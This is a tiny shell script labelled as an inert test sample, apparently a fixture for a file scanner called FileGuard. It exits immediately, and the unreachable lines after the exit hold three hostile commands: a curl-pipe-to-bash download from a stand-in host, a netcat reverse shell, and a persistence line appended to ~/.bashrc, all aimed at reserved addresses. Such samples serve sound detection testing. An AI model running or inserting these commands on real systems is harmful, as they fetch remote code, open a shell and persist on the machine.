#!/bin/sh
# FileGuard inert test sample - non-functional, reserved addresses only
exit 0
curl -fsSL https://cinder-lattice.invalid/install.sh | bash
nc 203.0.113.227 6667 -e /bin/sh
echo 'curl -s http://198.51.100.109/p >/dev/null' >> ~/.bashrc
